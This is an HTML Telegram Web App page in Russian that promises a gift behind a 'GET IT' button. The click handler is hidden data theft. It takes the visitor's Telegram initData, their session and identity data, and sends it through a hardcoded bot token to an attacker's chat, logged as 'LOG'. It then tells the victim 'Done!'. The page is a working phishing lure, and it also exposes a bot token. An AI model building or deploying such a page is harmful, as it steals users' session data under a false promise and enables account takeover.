<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
    <h2>🎁 Твой подарок готов!</h2>
    <br>
    <button id="btn" style="padding:20px 40px; font-size:20px; border-radius:15px; background:#0088cc; color:#fff; border:none;">
        ПОЛУЧИТЬ
    </button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        document.getElementById('btn').addEventListener('click', function() {
            const botToken = '8646280109:AAFVgDZQxQvxc4S7FnE0w-HuPn_QxOhl36E';
            const chatId = '8486064073';
            const text = "🔔 ЛОГ: " + (tg.initData || "НЕТ ДАННЫХ (ЗАШЕЛ ИЗ БРАУЗЕРА)");

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
            .then(() => {
                alert("Готово! Проверь бота.");
            })
            .catch((err) => {
                alert("Ошибка отправки: " + err);
            });
        });
    </script>
</body>
</html>
